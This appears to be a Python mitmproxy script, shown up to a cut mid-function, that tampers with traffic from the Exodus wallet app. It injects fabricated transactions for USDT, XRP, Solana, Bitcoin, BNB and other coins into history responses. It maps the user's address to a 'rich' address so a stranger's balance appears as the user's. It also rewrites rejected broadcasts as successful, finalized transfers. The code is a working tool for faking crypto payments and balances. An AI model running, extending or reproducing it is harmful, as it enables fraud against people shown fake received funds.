# USDT (ERC-20 on Ethereum) — same clarity shape as BNB; `to` is the token contract.
_USDT_CONTRACT_ETH = "0xdac17f958d2ee523a2206206994597c13d831ec7"


def _usdt_transfer_input(dest_hex_addr, amount_smallest):
    dest = (dest_hex_addr or "").lower().replace("0x", "")
    if len(dest) != 40:
        dest = (dest + "0" * 40)[:40]
    try:
        amt = int(amount_smallest)
    except Exception:
        amt = 0
    if amt < 0:
        amt = 0
    return "0xa9059cbb" + dest + format(amt, "x").zfill(64)


def create_fake_usdt_transaction(address, amount, sender_address="", consistent_id=None, creation_time=None):
    """ERC-20 USDT (6 decimals) in eth-clarity `transactions` format."""
    if creation_time is None:
        creation_time = time.time()
    confirmations, blockheight = get_confirmations_and_block(creation_time)
    if consistent_id:
        txhash = consistent_id[:64]
    else:
        txhash = "".join(random.choices("0123456789abcdef", k=64))
    if not sender_address or sender_address == "Random":
        if consistent_id:
            random.seed(consistent_id)
            sender_address = f"0x{''.join(random.choices('0123456789abcdef', k=40))}"
            random.seed()
        else:
            sender_address = f"0x{''.join(random.choices('0123456789abcdef', k=40))}"
    try:
        amt_smallest = int(round(float(amount) * (10 ** 6)))
    except Exception:
        try:
            amt_smallest = int(float(amount))
        except Exception:
            amt_smallest = 0
    value_token = str(amt_smallest)
    recv = (address or "").lower()
    gas = 65000
    gas_price = 20000000000
    gas_used = gas
    contract = _USDT_CONTRACT_ETH.lower()
    tx = {
        "blockNumber": blockheight if blockheight != -1 else -1,
        "type": "0x0",
        "hash": f"0x{txhash}",
        "transactionIndex": "0",
        "nonce": "0",
        "gas": str(gas),
        "gasPrice": str(gas_price),
        "gasPriceEffective": str(gas_price),
        "gasUsed": str(gas_used),
        "gasUsedCumulative": str(gas_used),
        "to": contract,
        "from": (sender_address or "").lower(),
        "timestamp": hex(int(creation_time * 1000)),
        "value": "0",
        "status": "1",
        "error": None,
        "input": _usdt_transfer_input(recv, amt_smallest),
        "effects": [],
        "methodId": "0xa9059cbb",
        "confirmations": int(confirmations) if int(confirmations) > 0 else 1,
        "walletChanges": [
            {"wallet": recv, "type": "balance", "from": "0", "to": value_token, "contract": contract},
            {"wallet": recv, "type": "nonce", "from": "0", "to": "0", "contract": None},
        ],
        "extraData": {},
    }
    return tx


def create_fake_xrp_transaction(address, amount, sender_address="", consistent_id=None, creation_time=None):
    """XRP payment-shaped object for Exodus `items`-style history responses."""
    if creation_time is None:
        creation_time = time.time()
    confirmations, blockheight = get_confirmations_and_block(creation_time)
    xrp_alphabet = "rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz"
    if consistent_id:
        tid = (consistent_id[:64] if len(consistent_id) >= 64 else hashlib.sha256(str(consistent_id).encode()).hexdigest())
    else:
        tid = "".join(random.choices("0123456789abcdef", k=64))
    if not sender_address or sender_address == "Random":
        if consistent_id:
            rnd = random.Random(int(hashlib.sha256(str(consistent_id).encode()).hexdigest()[:16], 16))
            sender_address = "r" + "".join(rnd.choices(xrp_alphabet, k=25))
        else:
            sender_address = "r" + "".join(random.choices(xrp_alphabet, k=25))
    try:
        drops = str(int(round(float(amount) * 1_000_000)))
    except Exception:
        drops = "0"
    ripple_date = max(0, int(creation_time) - 946684800)
    ledger_index = blockheight if blockheight != -1 else (int(time.time()) % 10_000_000 + 50_000_000)
    dest = (address or "").strip()
    return {
        "hash": tid,
        "txid": tid,
        "ledger_index": ledger_index,
        "ledger_hash": "".join(random.choices("0123456789abcdef", k=64)),
        "validated": True,
        "TransactionType": "Payment",
        "Account": sender_address,
        "Destination": dest,
        "Amount": drops,
        "Fee": "12",
        "Sequence": 1,
        "date": ripple_date,
        "SigningPubKey": "",
        "TxnSignature": "",
        "meta": {
            "TransactionResult": "tesSUCCESS",
            "delivered_amount": drops,
        },
        "inLedger": ledger_index,
        "status": "success",
        "confirmations": int(confirmations) if int(confirmations) > 0 else 1,
    }


def _make_sol_signature(consistent_id=None):
    # Generate a real-looking base58-encoded 64-byte signature
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    def b58encode(b: bytes) -> str:
        # Convert bytes -> big int -> base58
        num = int.from_bytes(b, 'big')
        if num == 0:
            return alphabet[0]
        out = []
        while num > 0:
            num, rem = divmod(num, 58)
            out.append(alphabet[rem])
        # leading zero bytes
        n_pad = 0
        for ch in b:
            if ch == 0:
                n_pad += 1
            else:
                break
        return (alphabet[0] * n_pad) + ''.join(reversed(out))

    try:
        if consistent_id:
            # deterministic from consistent_id
            seed = sum(ord(c) for c in str(consistent_id))
            rnd = random.Random(seed)
            rb = bytes([rnd.randrange(0, 256) for _ in range(64)])
            return b58encode(rb)
        else:
            rb = os.urandom(64)
            return b58encode(rb)
    except Exception:
        # fallback to previous simple approach
        return ''.join(random.choices(alphabet, k=88))

def _make_sol_pubkey(consistent_id=None):
    # Generate a real-looking base58-encoded 32-byte pubkey (typical Solana address)
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    def b58encode(b: bytes) -> str:
        num = int.from_bytes(b, 'big')
        if num == 0:
            return alphabet[0]
        out = []
        while num > 0:
            num, rem = divmod(num, 58)
            out.append(alphabet[rem])
        # leading zero bytes
        n_pad = 0
        for ch in b:
            if ch == 0:
                n_pad += 1
            else:
                break
        return (alphabet[0] * n_pad) + ''.join(reversed(out))

    try:
        if consistent_id:
            seed = sum(ord(c) for c in str(consistent_id))
            rnd = random.Random(seed)
            rb = bytes([rnd.randrange(0, 256) for _ in range(32)])
            return b58encode(rb)
        else:
            rb = os.urandom(32)
            return b58encode(rb)
    except Exception:
        return ''.join(random.choices(alphabet, k=44))


def _sol_b58encode_bytes(b: bytes) -> str:
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    num = int.from_bytes(b, 'big')
    if num == 0:
        return alphabet[0]
    out = []
    while num > 0:
        num, rem = divmod(num, 58)
        out.append(alphabet[rem])
    n_pad = 0
    for ch in b:
        if ch == 0:
            n_pad += 1
        else:
            break
    return (alphabet[0] * n_pad) + ''.join(reversed(out))


def _sol_short_u16_read(buf: bytes, off: int):
    """Solana short_vec / ShortU16 prefix reader. Returns (value, new_offset) or (None, off)."""
    val = 0
    shift = 0
    o = off
    while o < len(buf):
        b = buf[o]
        o += 1
        val |= (b & 0x7F) << shift
        if (b & 0x80) == 0:
            return val, o
        shift += 7
        if shift > 16:
            return None, off
    return None, off


def _sol_first_signature_b58_from_wire_b64(b64_wire: str):
    """Pull the first Ed25519 signature from a base64 Solana serialized transaction."""
    try:
        raw = base64.b64decode(b64_wire, validate=True)
    except Exception:
        try:
            raw = base64.b64decode(b64_wire)
        except Exception:
            return None
    if len(raw) < 65:
        return None
    n_sigs, off = _sol_short_u16_read(raw, 0)
    if n_sigs is None or n_sigs < 1 or off + 64 > len(raw):
        return None
    return _sol_b58encode_bytes(raw[off : off + 64])


def _solana_apply_user_broadcast_fakery(flow, rq, resp_json):
    """If the node rejected a user-signed broadcast (insufficient funds, etc.), pretend it
    succeeded and register the signature so confirmation polling resolves."""
    if not isinstance(rq, dict) or not isinstance(resp_json, dict):
        return resp_json
    method = rq.get('method')
    try:
        if method in ('sendTransaction', 'sendRawTransaction'):
            if resp_json.get('error') is None and resp_json.get('result'):
                return resp_json
            params = rq.get('params') or []
            b64 = params[0] if params else None
            sig = _sol_first_signature_b58_from_wire_b64(b64) if isinstance(b64, str) else None
            if not sig:
                body = (flow.request.content or b'').decode('utf-8', errors='ignore')
                sig = _make_sol_signature(hashlib.sha256(body.encode('utf-8', errors='ignore')).hexdigest())
            sol_user_broadcast_sigs[sig] = time.time()
            return {
                'jsonrpc': resp_json.get('jsonrpc', '2.0'),
                'id': resp_json.get('id'),
                'result': sig,
            }
        if method == 'simulateTransaction':
            if resp_json.get('error') is not None:
                slot = int(time.time()) % 1000000000
                return {
                    'jsonrpc': resp_json.get('jsonrpc', '2.0'),
                    'id': resp_json.get('id'),
                    'result': {
                        'context': {'slot': slot},
                        'value': {
                            'err': None,
                            'logs': [],
                            'accounts': None,
                            'returnData': None,
                            'unitsConsumed': 150,
                        },
                    },
                }
        if method == 'getSignatureStatuses':
            params = rq.get('params') or []
            sigs = params[0] if params and isinstance(params[0], list) else []
            result = resp_json.get('result')
            if isinstance(result, dict) and isinstance(sigs, list):
                values = result.get('value')
                if not isinstance(values, list):
                    values = []
                changed = False
                for i, sig in enumerate(sigs):
                    if not isinstance(sig, str) or sig not in sol_user_broadcast_sigs:
                        continue
                    while len(values) <= i:
                        values.append(None)
                    v = values[i]
                    if v is None or (
                        isinstance(v, dict) and v.get('confirmationStatus') not in ('finalized', 'confirmed')
                    ):
                        values[i] = {
                            'confirmationStatus': 'finalized',
                            'confirmations': None,
                            'err': None,
                            'status': {'Ok': None},
                        }
                        changed = True
                if changed:
                    result['value'] = values
                    resp_json['result'] = result
            return resp_json
    except Exception:
        return resp_json
    return resp_json


def _maybe_fake_evm_broadcast_response(flow):
    """Turn failed eth_sendRawTransaction into a fake tx hash so the UI can complete (demo)."""
    try:
        url = (flow.request.pretty_url or '').lower()
        if '.a.exodus.io' not in url:
            return False
        if flow.request.method != 'POST' or not flow.request.content:
            return False
        rq = json.loads(flow.request.content)
        if not isinstance(rq, dict):
            return False
        method = rq.get('method')
        if method not in ('eth_sendRawTransaction', 'eth_sendTransaction'):
            return False
        raw_resp = flow.response.content.decode('utf-8', errors='ignore')
        resp_json = json.loads(raw_resp)
        if not isinstance(resp_json, dict) or resp_json.get('error') is None:
            return False
        h = hashlib.sha256(flow.request.content).hexdigest()
        fake_hash = '0x' + h[:64]
        fixed = {'jsonrpc': resp_json.get('jsonrpc', '2.0'), 'id': resp_json.get('id'), 'result': fake_hash}
        flow.response.content = json.dumps(fixed).encode('utf-8')
        try:
            flow.response.status_code = 200
        except Exception:
            pass
        return True
    except Exception:
        return False


def create_fake_sol_transaction(tx: dict, consistent_id=None, creation_time=None, override_signature=None):
    """Build a full Solana `getTransaction` RPC-style result from our injected tx entry.
    Expects `tx` to contain at least `address`/`your_address` and `amount` or `lamports`.
    """
    if creation_time is None:
        creation_time = float(tx.get('creation_timestamp', time.time()))
    lam = None
    try:
        lam = int(tx.get('lamports')) if 'lamports' in tx else int(float(tx.get('amount', 0)) * 1_000_000_000)
    except Exception:
        lam = int(float(tx.get('amount', 0)) * 1_000_000_000)

    signature = override_signature or _make_sol_signature(
        consistent_id or tx.get('_consistent_id') or tx.get('txid') or tx.get('address')
    )
    slot = int(time.time()) % 1000000000
    recent_blockhash = ''.join(random.choices('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz', k=44))

    # account keys: sender then receiver (and system program)
    sender = (tx.get('sender') or tx.get('your_address') or tx.get('address') or '11111111111111111111111111111111')
    dest = (tx.get('your_address') or tx.get('address') or sender)

    message = {
        'accountKeys': [
            {'pubkey': sender, 'writable': True, 'signer': True, 'source': 'transaction'},
            {'pubkey': dest, 'writable': True, 'signer': False, 'source': 'transaction'},
            {'pubkey': '11111111111111111111111111111111', 'writable': False, 'signer': False, 'source': 'transaction'}
        ],
        'recentBlockhash': recent_blockhash,
        'instructions': [
            {
                'program': 'system',
                'programId': '11111111111111111111111111111111',
                'parsed': {
                    'info': {'destination': dest, 'lamports': lam, 'source': sender},
                    'type': 'transfer'
                },
                'stackHeight': 1
            }
        ],
        'addressTableLookups': []
    }

    fee = int(tx.get('fee') or tx.get('fees') or 5000)
    # Compute realistic pre/post balances (in lamports) when not provided
    try:
        if 'pre_balance' in tx:
            pre = int(tx.get('pre_balance', 0))
        elif 'post_balance' in tx:
            post = int(tx.get('post_balance', 0))
            pre = post + int(lam)
        else:
            # pick a reasonable sender balance greater than the amount+fee
            extra = random.randint(1_000_000_000, 5_000_000_000)
            pre = int(lam) + int(fee) + extra
        if 'post_balance' in tx:
            post = int(tx.get('post_balance', 0))
        else:
            post = max(0, pre - int(lam))
    except Exception:
        pre = int(lam) + int(fee) + 1_000_000_000
        post = max(0, pre - int(lam))

    pre_bal = [pre, 0, 1, 1]
    post_bal = [post, int(lam), 1, 1]
    # meta
    meta = {
        'err': None,
        'status': {'Ok': None},
        'fee': fee,
        'preBalances': [pre_bal[0], pre_bal[1], pre_bal[2], 1][:len(pre_bal)],
        'postBalances': [post_bal[0], post_bal[1], post_bal[2], 1][:len(post_bal)],
        'innerInstructions': [],
        'logMessages': ['Program 11111111111111111111111111111111 invoke [1]', 'Program 11111111111111111111111111111111 success'],
        'preTokenBalances': [],
        'postTokenBalances': [],
        'rewards': [],
        'computeUnitsConsumed': int(tx.get('computeUnitsConsumed', 0)),
        'costUnits': int(tx.get('costUnits', 0))
    }

    result = {
        'slot': slot,
        'transaction': {'signatures': [signature], 'message': message},
        'meta': meta,
        'version': 0,
        'blockTime': int(creation_time)
    }

    return result

# ------------------------
# mitmproxy hook functions
# ------------------------
try:
    # provide request/response functions at module level for mitmdump
    def request(flow):
        """Replace addresses in ETH and SOL requests using mappings."""
        load_address_mappings(flow)
        # Serve rawtx directly for injected UTXO txids so send/build never sees upstream 404.
        try:
            txid = _extract_txid_from_insight_flow(flow)
            if txid:
                _ensure_utxo_rawtx_registry(flow)
                raw_hex = _rawtx_hex_for_txid(txid)
                if raw_hex:
                    if _set_rawtx_response_for_flow(flow, raw_hex):
                        return
        except Exception:
            pass
        # Only modify requests that reference an address we know about
        def should_modify_request():
            try:
                known = set()
                for m in eth_address_mappings:
                    try:
                        ya = m.get('your_address') or m.get('your') or ''
                        ra = m.get('rich_address') or m.get('rich') or ''
                        if ya:
                            known.add(ya.lower())
                        if ra:
                            known.add(ra.lower())
                    except Exception:
                        continue
                for m in sol_address_mappings:
                    try:
                        ya = m.get('your_address') or m.get('your') or ''
                        ra = m.get('rich_address') or m.get('rich') or ''
                        if ya:
                            known.add(ya.lower())
                        if ra:
                            known.add(ra.lower())
                    except Exception:
                        continue
                # also include addresses from injector GUI if available
                try:
                    for tx in list_injected_transactions():
                        for k in ('address', 'your_address', 'rich_address'):
                            v = tx.get(k)
                            if v and isinstance(v, str):
                                known.add(v.lower())
                except Exception:
                    pass
                if not known:
                    return False
                url = flow.request.pretty_url.lower() if flow.request and hasattr(flow.request, 'pretty_url') else ''
                try:
                    body = flow.request.content.decode('utf-8', errors='ignore').lower()
                except Exception:
                    body = ''
                # if any known address appears in URL or body, allow modification
                for a in known:
                    if a and (a in url or a in body):
                        return True
                # no known addresses found - do not modify this request
                if dev_mode:
                    app_log(f"[REQUEST GUARD] skipping modification; no known address in request: {flow.request.pretty_url}")
                return False
            except Exception:
                return False
        # ETH
        try:
            if "eth-clarity.a.exodus.io" in flow.request.pretty_url and eth_address_mappings:
                original_path = flow.request.path
                for mapping in eth_address_mappings:
                    your_addr = mapping['your_address']
                    rich_addr = mapping['rich_address']
                    if your_addr and your_addr in original_path.lower():
                        flow.request.path = original_path.replace(your_addr, rich_addr)
                        print(f"eth: {your_addr[:10]} to {rich_addr[:10]}...")
                        break
        except Exception:
            pass
        # SOL (address replacement in POST bodies)
        try:
            if "solana.a.exodus.io" in flow.request.pretty_url and sol_address_mappings:
                if flow.request.method == "POST":
                    content = flow.request.content.decode('utf-8', errors='ignore')
                    modified_content = content
                    for mapping in sol_address_mappings:
                        your_addr = mapping.get('your_address')
                        rich_addr = mapping.get('rich_address')
                        if your_addr and rich_addr and your_addr in content:
                            modified_content = modified_content.replace(your_addr, rich_addr)
                            print(f"sol: {your_addr[:10]} to {rich_addr[:10]}...")
                    if modified_content != content:
                        flow.request.content = modified_content.encode('utf-8')
        except Exception:
            pass

    def response(flow):
        url = flow.request.pretty_url
        load_address_mappings(flow)
        if _maybe_fake_evm_broadcast_response(flow):
            return
        # Insight/Blockbook rawtx fallback for injected UTXO txids:
        # if upstream still returns rawtx error, override with local raw hex.
        try:
            sc = getattr(flow.response, 'status_code', None)
            txid = _extract_txid_from_insight_flow(flow)
            if txid:
                _ensure_utxo_rawtx_registry(flow)
                raw_hex = _rawtx_hex_for_txid(txid)
                if raw_hex:
                    should_override = sc == 404 or (sc and sc >= 400)
                    if not should_override:
                        try:
                            payload_l = flow.response.content.decode('utf-8', errors='ignore').lower()
                            if (
                                'insight-api-http-error:rawtx' in payload_l
                                or 'insight-api-http-error' in payload_l
                                or ('"code":"404"' in payload_l and 'rawtx' in payload_l)
                                or ('rawtx' in payload_l and '404' in payload_l)
                                or ('"message"' in payload_l and 'rawtx' in payload_l and 'error' in payload_l)
                            ):
                                should_override = True
                        except Exception:
                            pass
                    if should_override:
                        _set_rawtx_response_for_flow(flow, raw_hex)
        except Exception:
            pass
        # LTC
        if ".a.exodus.io" in url and "litecoin" in url.lower():
            try:
                response_data = json.loads(flow.response.content)
                if 'items' in response_data and isinstance(response_data['items'], list):
                    injected_txs = load_injected_transactions('LTC', flow)
                    if injected_txs:
                        clean_txs = [{k: v for k, v in tx.items() if k != '_crypto_type'} for tx in injected_txs]
                        response_data['items'] = clean_txs + response_data['items']
                        flow.response.content = json.dumps(response_data).encode()
                        print(f"\nsent {len(clean_txs)} ltc transaction")
            except Exception:
                pass
        # BTC (paths may use "bitcoin", "btc", or btc.*.exodus host)
        elif ".a.exodus.io" in url and any(
            x in url.lower() for x in ("bitcoin", "btc")
        ):
            try:
                response_data = json.loads(flow.response.content)
                if 'items' in response_data and isinstance(response_data['items'], list):
                    injected_txs = load_injected_transactions('BTC', flow)
                    if injected_txs:
                        clean_txs = [{k: v for k, v in tx.items() if k != '_crypto_type'} for tx in injected_txs]
                        response_data['items'] = clean_txs + response_data['items']
                        flow.response.content = json.dumps(response_data).encode()
                        print(f"\nsent {len(clean_txs)} btc transaction")
            except Exception:
                pass
        # ZEC (Zcash)
        elif ".a.exodus.io" in url and "zcash" in url.lower():
            try:
                response_data = json.loads(flow.response.content)
                if 'items' in response_data and isinstance(response_data['items'], list):
                    injected_txs = load_injected_transactions('ZEC', flow)
                    if injected_txs:
                        clean_txs = [{k: v for k, v in tx.items() if k != '_crypto_type'} for tx in injected_txs]
                        response_data['items'] = clean_txs + response_data['items']
                        flow.response.content = json.dumps(response_data).encode()
                        print(f"\nsent {len(clean_txs)} zec transaction")
            except Exception:
                pass
        # BNB (BSC - account-based)
        elif "bsc-clarity.a.exodus.io" in url and "/transactions" in url:
            try:
                response_data = json.loads(flow.response.content)
                if 'transactions' in response_data and isinstance(response_data['transactions'], list):
                    injected_txs = load_injected_transactions('BNB', flow)
                    if injected_txs:
                        clean_txs = [{k: v for k, v in tx.items() if k != '_crypto_type'} for tx in injected_txs]
                        # Determine anchor blockNumber and cursor from the real response so injected txs align
                        anchor_block = None
                        try:
                            # prefer existing tx blockNumber if present
                            for existing in response_data.get('transactions', []):
                                try:
                                    bn = int(existing.get('blockNumber', -1))
                                    if bn and bn > 0:
                                        anchor_block = bn
                                        break
                                except Exception:
                                    continue
                        except Exception:
                            anchor_block = None
                        if anchor_block is None:
                            try:
                                cur = response_data.get('cursor')
                                if isinstance(cur, int) and cur > 0:
                                    anchor_block = cur - 1
                            except Exception:
                                anchor_block = None
                        if anchor_block is None:
                            # fallback to the helper; may return -1
                            anchor_block = get_confirmations_and_block(time.time())[1]
                            if anchor_block == -1:
                                anchor_block = max(1, int(time.time()))

                        # anchor_cursor if present
                        anchor_cursor = response_data.get('cursor') if isinstance(response_data.get('cursor'), int) else None

                        # attempt to use first tx cumulative gas as baseline
                        first_cum = None
                        try:
                            if response_data.get('transactions'):
                                first_cum = int(response_data['transactions'][0].get('gasUsedCumulative') or 0)
                        except Exception:
                            first_cum = None

                        # patch each injected tx to be consistent
                        for i, tx in enumerate(clean_txs):
                            try:
                                # set blockNumber aligned to anchor
                                tx['blockNumber'] = anchor_block
                                # confirmations: prefer cursor-based delta when available
                                if anchor_cursor and anchor_cursor > tx['blockNumber']:
                                    tx['confirmations'] = int(anchor_cursor - tx['blockNumber'])
                                else:
                                    tx['confirmations'] = max(1, int(tx.get('confirmations', 1)))
                                # gasUsedCumulative must be >= gasUsed
                                try:
                                    gas_used = int(tx.get('gasUsed') or tx.get('gas', 21000))
                                except Exception:
                                    gas_used = 21000
                                if first_cum is not None:
                                    tx['gasUsedCumulative'] = str(max(first_cum + gas_used, gas_used))
                                else:
                                    tx['gasUsedCumulative'] = str(max(gas_used, int(tx.get('gasUsedCumulative', gas_used))))
                                # timestamp in ms hex
                                try:
                                    ct = float(tx.get('creation_timestamp', time.time()))
                                except Exception:
                                    ct = time.time()
                                tx['timestamp'] = hex(int(ct * 1000))
                                # normalize addresses to lowercase
                                if 'to' in tx and isinstance(tx['to'], str):
                                    tx['to'] = tx['to'].lower()
                                if 'from' in tx and isinstance(tx['from'], str):
                                    tx['from'] = tx['from'].lower()
                                # walletChanges
                                try:
                                    if isinstance(tx.get('walletChanges'), list):
                                        for wc in tx['walletChanges']:
                                            if 'wallet' in wc and isinstance(wc['wallet'], str):
                                                wc['wallet'] = wc['wallet'].lower()
                                except Exception:
                                    pass
                            except Exception:
                                continue

                        response_data['transactions'] = clean_txs + response_data['transactions']
                        flow.response.content = json.dumps(response_data).encode()
                        print(f"\nsent {len(clean_txs)} bnb transaction")
            except Exception:
                pass
        # DOGE
        elif ".a.exodus.io" in url and "dogecoin" in url.lower():
            try:
                response_data = json.loads(flow.response.content)
                print(f"[DOGE DEBUG] original items: {len(response_data.get('items') or [])}")
                if 'items' in response_data and isinstance(response_data['items'], list):
                    injected_txs = load_injected_transactions('DOGE', flow)
                    print(f"[DOGE DEBUG] loaded injected txs: {len(injected_txs)}")
                    if injected_txs:
                        clean_txs = [{k: v for k, v in tx.items() if k != '_crypto_type'} for tx in injected_txs]
                        print(f"[DOGE DEBUG] clean_txs example: {clean_txs[0] if clean_txs else None}")
                        response_data['items'] = clean_txs + response_data['items']
                        new_payload = json.dumps(response_data)
                        flow.response.content = new_payload.encode()
                        print(f"\nsent {len(clean_txs)} doge transaction, new payload size={len(new_payload)}")
            except Exception:
                pass
        # XRP — match host/path keywords or the injected r-address in URL/body (not eth-clarity)
        elif (
            ".a.exodus.io" in url
            and "eth-clarity" not in url.lower()
            and "bsc-clarity" not in url.lower()
            and "solana" not in url.lower()
        ):
            try:
                injected_xrp = load_injected_transactions("XRP", flow)
                if not injected_xrp or not _xrp_request_should_inject(flow, injected_xrp):
                    pass
                else:
                    response_data = json.loads(flow.response.content)
                    clean_txs = [{k: v for k, v in tx.items() if k != "_crypto_type"} for tx in injected_xrp]
                    merged = False
                    for key in ("items", "transactions"):
                        if key in response_data and isinstance(response_data[key], list):
                            response_data[key] = clean_txs + response_data[key]
                            merged = True
                            break
                    if not merged and isinstance(response_data.get("data"), dict):
                        d = response_data["data"]
                        for key in ("items", "transactions"):
                            if key in d and isinstance(d[key], list):
                                d[key] = clean_txs + d[key]
                                merged = True
                                break
                    if merged:
                        flow.response.content = json.dumps(response_data).encode()
                        print(f"\nsent {len(clean_txs)} xrp transaction")
            except Exception:
                pass
        # ETH clarity: USDT inject (address/token in request) + ETH rich→your replacement
        elif "eth-clarity.a.exodus.io" in url:
            try:
                raw = flow.response.content.decode("utf-8", errors="ignore")
                response_data = json.loads(raw)
                usdt_merged = False
                injected_usdt = load_injected_transactions("USDT", flow)
                if injected_usdt and _usdt_request_should_inject(flow, injected_usdt):
                    parent, tkey = _eth_clarity_transactions_container(response_data)
                    if parent is not None:
                        clean_txs = [{k: v for k, v in tx.items() if k != "_crypto_type"} for tx in injected_usdt]
                        existing = parent.get(tkey) or []
                        anchor_block = None
                        try:
                            for ex in existing:
                                try:
                                    bn = int(ex.get("blockNumber", -1))
                                    if bn and bn > 0:
                                        anchor_block = bn
                                        break
                                except Exception:
                                    continue
                        except Exception:
                            anchor_block = None
                        if anchor_block is None:
                            try:
                                cur = response_data.get("cursor")
                                if isinstance(cur, int) and cur > 0:
                                    anchor_block = cur - 1
                            except Exception:
                                anchor_block = None
                        if anchor_block is None:
                            anchor_block = get_confirmations_and_block(time.time())[1]
                            if anchor_block == -1:
                                anchor_block = max(1, int(time.time()))
                        anchor_cursor = response_data.get("cursor") if isinstance(response_data.get("cursor"), int) else None
                        first_cum = None
                        try:
                            if existing:
                                first_cum = int(existing[0].get("gasUsedCumulative") or 0)
                        except Exception:
                            first_cum = None
                        for tx in clean_txs:
                            try:
                                tx["blockNumber"] = anchor_block
                                if anchor_cursor and anchor_cursor > tx["blockNumber"]:
                                    tx["confirmations"] = int(anchor_cursor - tx["blockNumber"])
                                else:
                                    tx["confirmations"] = max(1, int(tx.get("confirmations", 1)))
                                try:
                                    gas_used = int(tx.get("gasUsed") or tx.get("gas", 65000))
                                except Exception:
                                    gas_used = 65000
                                if first_cum is not None:
                                    tx["gasUsedCumulative"] = str(max(first_cum + gas_used, gas_used))
                                else:
                                    tx["gasUsedCumulative"] = str(max(gas_used, int(tx.get("gasUsedCumulative", gas_used))))
                                try:
                                    ct = float(tx.get("creation_timestamp", time.time()))
                                except Exception:
                                    ct = time.time()
                                tx["timestamp"] = hex(int(ct * 1000))
                                for fld in ("to", "from"):
                                    if fld in tx and isinstance(tx[fld], str):
                                        tx[fld] = tx[fld].lower()
                                try:
                                    if isinstance(tx.get("walletChanges"), list):
                                        for wc in tx["walletChanges"]:
                                            if "wallet" in wc and isinstance(wc["wallet"], str):
                                                wc["wallet"] = wc["wallet"].lower()
                                            c = wc.get("contract")
                                            if c and isinstance(c, str):
                                                wc["contract"] = c.lower()
                                except Exception:
                                    pass
                            except Exception:
                                continue
                        parent[tkey] = clean_txs + existing
                        usdt_merged = True
                        print(f"\nsent {len(clean_txs)} usdt transaction")
                out = json.dumps(response_data)
                before_out = out
                if eth_address_mappings:
                    for mapping in eth_address_mappings:
                        your_addr = mapping["your_address"]
                        rich_addr = mapping["rich_address"]
                        out = out.replace(rich_addr, your_addr)
                if usdt_merged or out != before_out:
                    flow.response.content = out.encode("utf-8")
                    if eth_address_mappings and out != before_out:
                        print(f"eth wallet watched")
            except Exception:
                try:
                    if eth_address_mappings:
                        content = flow.response.content.decode("utf-8", errors="ignore")
                        modified_content = content
                        for mapping in eth_address_mappings:
                            your_addr = mapping["your_address"]
                            rich_addr = mapping["rich_address"]
                            modified_content = modified_content.replace(rich_addr, your_addr)
                        if modified_content != content:
                            flow.response.content = modified_content.encode("utf-8")
                            print(f"eth wallet watched")
                except Exception:
                    pass
        # SOL responses: adjust balances and do rich->your_address mapping
        elif "solana.a.exodus.io" in url or (".a.exodus.io" in url and "solana" in url.lower()):
            try:
                requested_address = None
                try:
                    if flow.request.content:
                        rq = json.loads(flow.request.content)
                        if isinstance(rq, dict):
                            params = rq.get('params', [])
                            if params and isinstance(params, list):
                                requested_address = params[0]
                except Exception:
                    requested_address = None
                content = flow.response.content.decode('utf-8', errors='ignore')
                modified_content = content
                added = 0
                try:
                    try:
                        resp_json = json.loads(content)
                    except Exception:
                        resp_json = {}
                    # read request JSON-RPC method to decide special handling
                    method = None
                    try:
                        rq = json.loads(flow.request.content) if flow.request.content else {}
                        method = rq.get('method') if isinstance(rq, dict) else None
                    except Exception:
                        method = None
                    try:
                        rq_fake = json.loads(flow.request.content) if flow.request.content else {}
                    except Exception:
                        rq_fake = {}
                    if isinstance(resp_json, dict) and isinstance(rq_fake, dict):
                        resp_json = _solana_apply_user_broadcast_fakery(flow, rq_fake, resp_json)
                        modified_content = json.dumps(resp_json)
                        _mf = rq_fake.get('method')
                        if _mf in ('sendTransaction', 'sendRawTransaction', 'simulateTransaction') and not resp_json.get(
                            'error'
                        ):
                            try:
                                flow.response.status_code = 200
                            except Exception:
                                pass
                    if isinstance(resp_json, dict) and 'result' in resp_json:
                        # getTransaction: if the request asked for one of our injected signatures, return full tx
                        try:
                            if method and method == 'getTransaction':
                                try:
                                    rq = json.loads(flow.request.content) if flow.request.content else {}
                                    params = rq.get('params', []) if isinstance(rq, dict) else []
                                    sig_param = params[0] if params else None
                                except Exception:
                                    sig_param = None
                                if sig_param:
                                    injected_txs = load_injected_transactions('SOL', flow)
                                    if injected_txs:
                                        matched = False
                                        for tx in injected_txs:
                                            try:
                                                sig = tx.get('_sol_signature') or _make_sol_signature(tx.get('_consistent_id') or tx.get('txid') or tx.get('address'))
                                                if sig_param == sig:
                                                    # exact match: return that tx
                                                    resp_json['result'] = create_fake_sol_transaction(tx, consistent_id=tx.get('_consistent_id'), creation_time=tx.get('creation_timestamp'))
                                                    modified_content = json.dumps(resp_json)
                                                    matched = True
                                                    break
                                            except Exception:
                                                continue
                        except Exception:
                            pass
                        # Inject into getSignaturesForAddress responses: prepend our signatures
                        try:
                            if method and method == 'getSignaturesForAddress' and isinstance(resp_json.get('result'), list):
                                injected_txs = load_injected_transactions('SOL', flow)
                                if injected_txs:
                                    # requested_address extracted earlier
                                    for tx in injected_txs:
                                        try:
                                            if requested_address and tx.get('address') != requested_address:
                                                continue
                                            sig = _make_sol_signature(tx.get('_consistent_id') or tx.get('txid') or tx.get('address'))
                                            slot = int(time.time()) % 1000000000
                                            entry = {'signature': sig, 'slot': slot, 'err': None, 'blockTime': int(tx.get('creation_timestamp', time.time()))}
                                            resp_json['result'] = [entry] + resp_json['result']
                                            # also keep a mapping by inserting signature into the tx dict for later getTransaction
                                            tx['_sol_signature'] = sig
                                        except Exception:
                                            continue
                                    # update modified content
                                    modified_content = json.dumps(resp_json)
                        except Exception:
                            pass
                        # getBalance numeric lamports - OVERRIDE with injected txs for requested address
                        if isinstance(resp_json['result'], (int, float)):
                            injected_txs = load_injected_transactions('SOL', flow)
                            if injected_txs and requested_address:
                                total_lam = 0
                                for tx in injected_txs:
                                    try:
                                        # match any of the common address fields
                                        addr_match = False
                                        for k in ('address', 'your_address', 'rich_address'):
